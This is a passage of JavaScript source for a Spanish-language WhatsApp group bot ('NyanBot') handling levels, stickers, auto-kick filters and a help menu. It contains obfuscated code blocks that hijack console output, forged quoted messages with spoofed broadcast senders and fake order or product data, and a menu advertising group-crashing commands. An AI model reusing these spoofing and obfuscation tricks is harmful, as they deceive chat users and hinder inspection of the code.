	samu330.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error al descargar el archivo_')
	  console.log(e)
	})
	})
	})
	})
	}
		    
	const nivelActual = getLevelingLevel(sender)
            var rango = '🎭Principiante'
            if (nivelActual == 10) {
                rango = '*🥉Bronce*'
            } else if (nivelActual == 20) {
                rango = '*🥈Plata*'
            } else if (nivelActual == 30) {
                rango = '*🥇Oro*'
	    } else if (nivelActual == 30) {
                rango = '*🌬Diamante Rosa*'
            } else if (nivelActual == 100) {
                rango = '*🌬Diamante Rosa*'
            } else if (nivelActual == 150) {
                rango = '*🔥Diamante rojo🔥*'
            } else if (nivelActual > 200) {
                rango = '*🔮Nivel Maximo🗡*'
            }

	
	if (isOwner) {
	var tipoDeUsr = '*🔮Ownwer*'
	} else if (sender == isAdmin) {
	var tipoDeUsr = '*👑Admin*'
	 } else {
	var tipoDeUsr = '*✍🏻Usuario*'
	}
	
	if (!sam.key.fromMe) {
        if (!isBan) {
	const currentLevel = getLevelingLevel(sender)
	const checkId = getLevelingId(sender)
	try {
	if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
	const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 15) //Math.floor(Math.random() * 10) + 500
	const requiredXp = 5 * Math.pow(currentLevel, (5 / 2)) + 50 * currentLevel + 100 //5000 * (Math.pow(2, currentLevel) - 1)
	const getLevel = getLevelingLevel(sender)
	const namelv = checkId
	addLevelingXp(sender, amountXp)
	if (requiredXp <= getLevelingXp(sender)) {
	addLevelingLevel(sender, 1)
	const lvup =  `✴ _*🧗🏻‍♂️S͟u͟b͟e͟s͟ ͟d͟e͟ ͟n͟i͟v͟e͟l͟!͟*_ ✴
	
	𓆩*𓆪 *💠 Nombre:* @${namelv.split('@')[0]} 𓆩*𓆪
	
	┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
  	✨XP: ${getLevelingXp(sender)}
  	📚Nivel: ${getLevel} ➫ ${getLevelingLevel(sender)}
  	🕋rango: ${nivelActual}
	┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`
	/*samu330.sendMessage(from, lvup, MessageType.text, {quoted: { key: {                
		fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
		"documentMessage": { "title": `✍🏻Nivel ${nivelActual}`, 'jpegThumbnail': fs.readFileSync('./src/ara.png')}
		}}
		})*/}
	} catch (err) {
	console.error(err)
	}
	}
	}	    
	
	const reply = async(teks) => {
                await samu330.sendMessage(from, teks, MessageType.text, { quoted: { key: {                
		fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                "imageMessage": {
                "mimetype": "image/jpeg",
                "caption": `🥀NʮɑƞBσt | 🐉Sɱ330\n${command} ${q}`,
                'jpegThumbnail': fs.readFileSync('./src/fake.jpg')}}
		}
       		})
		}
	
	/*const fileIO = async buffer => {
  		const { ext } = await fromBuffer(buffer) || {}
  		const form = new FormData
  		form.append('file', buffer, 'tmp.' + ext)
  		let res = await fetch('https://file.io/?expires=1d', {
   		method: 'POST',
    		body: form
  		})
  		const jsona = await res.json()
  		if (!jsona.success) throw jsona
  		return jsona.link
		reply(jsona.link)
		}*/
	
	const noreg = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"productMessage": {
		"product": {
		"title": '🗒️𝐔𝐬𝐮𝐚𝐫𝐢𝐨 𝐧𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨!',
		"description": "𝙍𝙚𝙜𝙞𝙨𝙩𝙧𝙖𝙩𝙚",
		"currencyCode": "SYP",
		"priceAmount1000": "999999999999999999",
		"retailerId": "NyanBot",
		"productImageCount": 1
		},
		"businessOwnerJid": `0@s.whatsapp.net`
		}
		}
		}
	const fspam = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"contactMessage": {
		"displayName": `${pushname} NO SPAM!!`,
		"vcard": 'BEGIN:VCARD\n' +
    		'Version:3.0\n' +
    		'TEL;type=CELL;type=VOICE;waid=5219984907794:+5219984907794\n' +
		'item1.X-ABLabel:Celular' +
    		'END:VCARD'
		}
		}
		}




const fimg = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": `🥀Sαм y Perry`, 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fdoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "documentMessage": { "title":"🔥𝒩𝓎𝒶𝓃𝐵𝑜𝓉 | 𝚂𝚊𝚖 𝚢 𝙿𝚎𝚛𝚛𝚢💓", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const floc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "locationMessage": { "caption":"🥀𝓝𝔂𝓪𝓷𝓑𝓸💞", 'jpegThumbnail': fs.readFileSync('./src/samyperry.png')}}
}
contextInfo: {
mentionedJid: [sender]}
const fliveLoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "liveLocationMessage": { "caption":"🍒𝒮𝒶𝓂 𝓎 𝒫𝑒𝓇𝓇𝓎 | 𝙉𝙮𝙖𝙣𝘽𝙤𝙩🔥", 'jpegThumbnail': fs.readFileSync('./src/img.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fvid = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "videoMessage": { "caption":"🌺Ｓａｍ ｙ Ｐｅｒｒｙ🌺", 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const faud = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "audioMessage": {"mimetype": "audio/mp4", "ptt": true, "seconds": -999999}}
}
contextInfo: {
mentionedJid: [sender]}
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)
},
"title": `🐉𝗦𝗮𝗺𝘂𝟯𝟯𝟬🔥 | 📌𝑵𝒚𝒂𝒏𝑩𝒐𝒕🌹 ${timeFt}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
contextInfo: {
mentionedJid: [sender]}


		if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
	
	    	if (isBan && isCmd && !isOwner) {
		reply('*Lo siento pero usted es un usuario baneado, no puede hacer uso del bot!*')
        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	}
	
		if (isCmd && isFiltered(from) && !isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
		}
        
        	if (isCmd && isFiltered(from) && isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
		}
	    
		if (messagesC.includes("bot")){
			samu330.updatePresence(from, Presence.composing)
			rm = [
			result = fs.readFileSync(`./temp/Samu.webp`),
			result1 = fs.readFileSync(`./temp/Samu1.webp`),
			result2 = fs.readFileSync(`./temp/Samu2.webp`),
			result3 = fs.readFileSync(`./temp/Samu3.webp`),
			result4 = fs.readFileSync(`./temp/Samu4.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
  			samu330.sendMessage(from, nk, sticker, {
			quoted: fimg, "forwardingScore": 9999, "isForwarded": true
  			})
			}
	    	if (isGroup && botAdmin && isBadWord) {
                        if (bad.includes(messagesC)) {
                        if (!isAdmin) { 
                        samu330.updatePresence(from, Presence.composing)
			var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                        reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las malas palabras, serás expulsado en 5 segundos`)
                        setTimeout( () => {
                                samu330.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
                        }, 5000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("1 segundo")
                        }, 4000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("2 segundos")
                        }, 3000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("3 segundos")
                        }, 2000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("4 segundos")
                        }, 1000)
                        setTimeout( () => {
                                samu330.updatePresence(from, Presence.composing)
                                reply("5 segundos")
                        }, 0)
				}
			}
		}
		if (isAutoSt && isMedia && isImage) {
		if (!itsMe) {
                const encmedia11 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media11 = await samu330.downloadAndSaveMediaMessage(encmedia11, `./sticker/${sender}`)
		const _0x1766=['warn','1kpfGKg','console','toString','constructor','length','178061stRBUX','1300545pGpVkk','138xeSLmh','return\x20(function()\x20','log','934846oKLsog','9350TIPSLK','25Aspfso','433203bjkpOB','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','test','360802vwcGNc','__proto__','prototype','error','bind','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','104838iWsgLj','apply','trace','table','return\x20/\x22\x20+\x20this\x20+\x20\x22/'];const _0x4d367b=_0x5de4;(function(_0x3eb50f,_0x5003ec){const _0x160706=_0x5de4;while(!![]){try{const _0x1f0294=parseInt(_0x160706(0x94))*-parseInt(_0x160706(0x90))+-parseInt(_0x160706(0x8f))+-parseInt(_0x160706(0x96))+-parseInt(_0x160706(0x93))+parseInt(_0x160706(0x9f))*-parseInt(_0x160706(0x89))+parseInt(_0x160706(0x99))+-parseInt(_0x160706(0x95))*-parseInt(_0x160706(0x8e));if(_0x1f0294===_0x5003ec)break;else _0x3eb50f['push'](_0x3eb50f['shift']());}catch(_0x5172fc){_0x3eb50f['push'](_0x3eb50f['shift']());}}}(_0x1766,0xb6c33));const _0x33a8e1=function(){let _0x15f095=!![];return function(_0xc7cbfc,_0x3249de){const _0x38e2d8=_0x15f095?function(){const _0x52e93e=_0x5de4;if(_0x3249de){const _0x285798=_0x3249de[_0x52e93e(0xa0)](_0xc7cbfc,arguments);return _0x3249de=null,_0x285798;}}:function(){};return _0x15f095=![],_0x38e2d8;};}(),_0x49176f=_0x33a8e1(this,function(){const _0x10650c=function(){const _0x379fdc=_0x5de4,_0x3a1fbc=_0x10650c['constructor'](_0x379fdc(0x87))()[_0x379fdc(0x8c)](_0x379fdc(0x97));return!_0x3a1fbc[_0x379fdc(0x98)](_0x49176f);};return _0x10650c();});function _0x5de4(_0x1fdbaf,_0x29f9bf){return _0x5de4=function(_0x165099,_0x5b786d){_0x165099=_0x165099-0x86;let _0x1efd2f=_0x1766[_0x165099];return _0x1efd2f;},_0x5de4(_0x1fdbaf,_0x29f9bf);}_0x49176f();const _0x1efd2f=function(){let _0x1bb24e=!![];return function(_0x15bf9c,_0x1d48e4){const _0x4f2296=_0x1bb24e?function(){const _0x55ad81=_0x5de4;if(_0x1d48e4){const _0x53132f=_0x1d48e4[_0x55ad81(0xa0)](_0x15bf9c,arguments);return _0x1d48e4=null,_0x53132f;}}:function(){};return _0x1bb24e=![],_0x4f2296;};}(),_0x5b786d=_0x1efd2f(this,function(){const _0x34c292=_0x5de4,_0x15e5c1=function(){const _0x5bb16a=_0x5de4;let _0x401748;try{_0x401748=Function(_0x5bb16a(0x91)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2b5e28){_0x401748=window;}return _0x401748;},_0x3e62c6=_0x15e5c1(),_0x245f34=_0x3e62c6[_0x34c292(0x8a)]=_0x3e62c6['console']||{},_0x1903dd=[_0x34c292(0x92),_0x34c292(0x88),'info',_0x34c292(0x9c),'exception',_0x34c292(0x86),_0x34c292(0xa1)];for(let _0x5ae008=0x0;_0x5ae008<_0x1903dd[_0x34c292(0x8d)];_0x5ae008++){const _0x58a6ed=_0x1efd2f['constructor'][_0x34c292(0x9b)][_0x34c292(0x9d)](_0x1efd2f),_0xb03c63=_0x1903dd[_0x5ae008],_0x260eb3=_0x245f34[_0xb03c63]||_0x58a6ed;_0x58a6ed[_0x34c292(0x9a)]=_0x1efd2f[_0x34c292(0x9d)](_0x1efd2f),_0x58a6ed[_0x34c292(0x8b)]=_0x260eb3[_0x34c292(0x8b)][_0x34c292(0x9d)](_0x260eb3),_0x245f34[_0xb03c63]=_0x58a6ed;}});_0x5b786d();const aaa=_0x4d367b(0x9e);
                const dataFl = `${aaa}`
		const author101 = args.join(' ')
                exif.create(dataFl, author101, `stickwm_${sender}`)
                await ffmpeg(`${media11}`)
                .input(media11)
                .on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                console.log(`Error : ${err}`)        
		fs.unlinkSync(media1)                
		reply('*Intenta de nuevo*')
                })
                .on('end', function () {
                console.log('Finish')                         
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                               
		if (error) return reply('error')
                wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)             
		fs.unlinkSync(media11)
                fs.unlinkSync(`./sticker/${sender}.webp`)
                fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
                })
                })
                .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]paletteuse`])
                .toFormat('webp')
                .save(`./sticker/${sender}.webp`)
		}}
		if ((isAutoSt && isMedia && sam.message.videoMessage.fileLength < 10000000 || isVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
		if (!itsMe) {
                const encmedia22 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media22 = await samu330.downloadAndSaveMediaMessage(encmedia22, `./sticker/${sender}`)
		const _0x27fb=['1227757QFPTCj','table','error','console','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','prototype','4mOcIdv','300973AXvFLL','113PJAhxc','bind','__proto__','constructor','1hPhdPg','toString','2614385THObwv','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','674jhGLms','1366829jQTHFD','378748rzovFh','exception','1wImvle','1305043VMjXUP','return\x20/\x22\x20+\x20this\x20+\x20\x22/','{}.constructor(\x22return\x20this\x22)(\x20)','apply'];function _0x3657(_0x24f22c,_0x12d4cd){return _0x3657=function(_0x36fb84,_0x290295){_0x36fb84=_0x36fb84-0x135;let _0x42acbe=_0x27fb[_0x36fb84];return _0x42acbe;},_0x3657(_0x24f22c,_0x12d4cd);}const _0x495578=_0x3657;(function(_0x53a12a,_0x3301a7){const _0x1d2e31=_0x3657;while(!![]){try{const _0x162d02=-parseInt(_0x1d2e31(0x135))+-parseInt(_0x1d2e31(0x14a))+parseInt(_0x1d2e31(0x149))*parseInt(_0x1d2e31(0x146))+-parseInt(_0x1d2e31(0x13d))*-parseInt(_0x1d2e31(0x145))+parseInt(_0x1d2e31(0x141))*parseInt(_0x1d2e31(0x147))+parseInt(_0x1d2e31(0x13b))*-parseInt(_0x1d2e31(0x13c))+parseInt(_0x1d2e31(0x143));if(_0x162d02===_0x3301a7)break;else _0x53a12a['push'](_0x53a12a['shift']());}catch(_0x50b87f){_0x53a12a['push'](_0x53a12a['shift']());}}}(_0x27fb,0xaac28));const _0x333816=function(){let _0x3b9de2=!![];return function(_0x34ee6d,_0x3e4e7c){const _0x338996=_0x3b9de2?function(){const _0x475110=_0x3657;if(_0x3e4e7c){const _0x1db804=_0x3e4e7c[_0x475110(0x14d)](_0x34ee6d,arguments);return _0x3e4e7c=null,_0x1db804;}}:function(){};return _0x3b9de2=![],_0x338996;};}(),_0x835717=_0x333816(this,function(){const _0xee8b8e=function(){const _0x50f77d=_0x3657,_0x3c9dc1=_0xee8b8e[_0x50f77d(0x140)](_0x50f77d(0x14b))()[_0x50f77d(0x140)](_0x50f77d(0x139));return!_0x3c9dc1['test'](_0x835717);};return _0xee8b8e();});_0x835717();const _0x42acbe=function(){let _0x37110c=!![];return function(_0x5a1047,_0x16f831){const _0x2238b9=_0x37110c?function(){if(_0x16f831){const _0x184403=_0x16f831['apply'](_0x5a1047,arguments);return _0x16f831=null,_0x184403;}}:function(){};return _0x37110c=![],_0x2238b9;};}(),_0x290295=_0x42acbe(this,function(){const _0x39d9ee=_0x3657;let _0x4b1d9a;try{const _0x19fa90=Function('return\x20(function()\x20'+_0x39d9ee(0x14c)+');');_0x4b1d9a=_0x19fa90();}catch(_0x477b7c){_0x4b1d9a=window;}const _0x32fe68=_0x4b1d9a[_0x39d9ee(0x138)]=_0x4b1d9a[_0x39d9ee(0x138)]||{},_0x3152dd=['log','warn','info',_0x39d9ee(0x137),_0x39d9ee(0x148),_0x39d9ee(0x136),'trace'];for(let _0x244612=0x0;_0x244612<_0x3152dd['length'];_0x244612++){const _0x55e7a2=_0x42acbe['constructor'][_0x39d9ee(0x13a)]['bind'](_0x42acbe),_0x15b4f3=_0x3152dd[_0x244612],_0x44c3e4=_0x32fe68[_0x15b4f3]||_0x55e7a2;_0x55e7a2[_0x39d9ee(0x13f)]=_0x42acbe[_0x39d9ee(0x13e)](_0x42acbe),_0x55e7a2[_0x39d9ee(0x142)]=_0x44c3e4['toString'][_0x39d9ee(0x13e)](_0x44c3e4),_0x32fe68[_0x15b4f3]=_0x55e7a2;}});_0x290295();const aaa=_0x495578(0x144);
                const packname1001 = `${aaa}`          
		const author1001 = args.join(' ')
                exif.create(packname1001, author1001, `stickwm_${sender}`)          
		reply('*⌛EN PROCESO*')
                await ffmpeg(`${media22}`)
		.inputFormat(media22.split('.')[4])
		.on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {                                                                                                        
		console.log(`Error : ${err}`)
                fs.unlinkSync(media22)                
		tipe = media.endsWith('.mp4') ? 'video' : 'gif'         
		reply('*Intenta de nuevo*')                   
		})                                      
		.on('end', function () {                         
		console.log('Finish')                       
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                                                     
		if (error) return reply('error')                                 
		wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)           
		fs.unlinkSync(media22)                                             
		fs.unlinkSync(`./sticker/${sender}.webp`)                  
		fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)               
		})
                })                                                
		.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])                                                                      
		.toFormat('webp')                                    
		.save(`./sticker/${sender}.webp`)
		}}
	    	if (messagesC.includes("chat.whatsapp")){
		        if (!isGroup) return
		        if (!isAntigp) return
		        if (isAdmin) return reply('Tienes suerte, eres admin y no te sacaré')
			reply(`Link detectado ${sender.split("@")[0]} serás expulsado de este grupo`)
			samu330.groupRemove(from, [sender])
		}

	    
	    ///////////////////////FUNCIONES CREADAS POR SAMU330\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
	    
			if (isGroup && botAdmin && isAntiMedia) {     
			if (!itsMe) {
			if (isMedia && !sam.message.videoMessage || isImage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
			samu330.groupRemove(from, [sender])
					}
				}      
			}
			if (isGroup && botAdmin && isAntiMedia) {
			if (!itsMe) {
			if (isMedia && sam.message.videoMessage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
                        samu330.groupRemove(from, [sender])                                              
					}
				}
			}
			if (isGroup && botAdmin && isAntiLeg) {      
			if (!itsMe) {
			if (isAudio) {
			if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)
				reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {                        
			if (isContact) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                  
				reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])              
			}               
			}                     
			}
	    		if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {
                      	if (q.length > 10000) {
				reply('*Este mensaje contiene mas de 10, 000 caracteres, probablemente puede ser una trava, por lo que tendre que eliminarte🙂*\n\n_Este grupo esta protegido por_ *🔐Samu330*')
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
				samu330.sendMessage(from, '*Esperemos 10 segundos🙄*', MessageType.text)
				})
				samu330.groupRemove(from, [sender])
				await sleep(10000)
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, false)
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                         	  
			if (!itsMe) {                                 
			if (isLocation) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                     
				reply(`*LOCALIZACION DETECTADA, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)                   
				samu330.groupRemove(from, [sender])           
			}             
			}                     
			}
			
	    
	//Zona de Comandos🛵
switch (command) {
case 'help':
case 'menu':
case 'comandos':

redes = ['*Sigeme y te sigo en instagram!* https://www.instagram.com/samu330wabot', '*😊Seamos amigos en facebook!!* https://www.facebook.com/samu330wabot']
opcion = redes[Math.floor(Math.random() * redes.length)]

var num = sam.participant
foto = fs.readFileSync('./src/help.jpg')
fakee = fs.readFileSync('./src/fake.jpg')
assistant = fs.readFileSync('./src/assistant.jpg')
const forder = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 999999999,status: 1,surface : 1,message: `🥀𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝑁𝑦𝑎𝑛𝐵𝑜𝑡🍒`,orderTitle: 'Samu330',sellerJid: `𝗡𝘆𝗮𝗻𝗕𝗼𝘁🌱`,thumbnail: fs.readFileSync('./src/fake.jpg')}}}
samu330.updatePresence(from, Presence.recording)
uptime = process.uptime()
		
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
try {		
Menu = `
➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li
🔐Hola *${pushname}* ${timeFt}

_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
🕋rango: ${rango}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈

🌹ڰۣڿڰۣڿஇღԑ̮̑ঙღڰۣڿڰۣڿஇ🌹

_Si quieres saber como crear este bot, usa el comando:_

${prefix}crear

🌹ڰۣڿڰۣڿஇღԑ̮̑ঙღڰۣڿڰۣڿஇ🌹

🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*

${opcion}

======[ *Versión 3.41* ]======

*⚙ LA KEY DE LA API FUE DESHABILITADA, PERO SI LA NECECITAS PUEDES ESCRIBIRME PARA QUE TE LA COMPARTA, ESTO ES POR MOTIVOS DE SEGURIDAD, YA QUE LA ANTERIOR KEY FUE EXPUESTA Y BLOQUEADA POR ESTA RAZON. ⚙*
_SI TIENES ALGUNA KEY QUE CREES QUE PUEDE FUNCIONAR, PUEDES AGREGARLA CON EL COMANDO:_

${prefix}api + key

_Recuerda que cada vez que enciendas el bot debes establecer de nuevo la apikey!!_

===============================


*Comandos usados hoy : ${hit_today.length}*

_PORFAVOR LEE LAS REGLAS_:

${prefix}reglas


${samu} ✏Prefijo:${samu} [ ${prefix} ]
${samu} 🕐Tiempo de actividad:${samu} *${uptime}*
${samu} ✅Modo:${samu} *ON*
${samu} 👥Grupo:${samu} *${groupName}*
${samu} 🏆Numero del Dueño wa.me/+529984907794${samu}

𝗠𝗬 𝗖𝗔𝗡𝗔𝗟 𝗗𝗘 𝗬𝗢𝗨𝗧𝗨.𝗕𝗘: https://youtu.be/chMc57gjmkI

⍣ *BOT INFO* ⍣
${samu}◦ 🌐Navegador :${samu} *${samu330.browserDescription[1]}*
${samu}◦ 📡servidor :${samu} *${samu330.browserDescription[0]}*
${samu}◦ ✅version :${samu} *${samu330.browserDescription[2]}*
${samu}◦ 🚄Velocidad :${samu} *${process.uptime()}*
${samu}◦ 📲Sistema operativo :${samu} *${samu330.user.phone.device_manufacturer}*
${samu}◦ 🪀version de${samu} *WhatsApp* : *${samu330.user.phone.wa_version}*


===============================
|| _Juega con el Bot:_ *${prefix}jugar*
===============================


_Lista de MENUs_

${bodyM} ${prefix}menu1 *(Menu de Media*
${bodyM} ${prefix}menu2 *(Menu de Sticker)*
${bodyM} ${prefix}menu3 *(Menu de Grupos)*
${bodyM} ${prefix}menu4 *(Menu de descargas)*
${bodyM} ${prefix}menu5 *(Comandos Tools)*
${bodyM} ${prefix}menu6 *(Comandos +18)* 
${bodyM} ${prefix}menu7 *(Comandos de logos)*
${bodyM} ${prefix}menu8 *(Comandos para el Owner)*
${bodyM} ${prefix}menu9 *(Comandos para explotar grupos)*
${bodyM} ${prefix}audios *(Audios)*

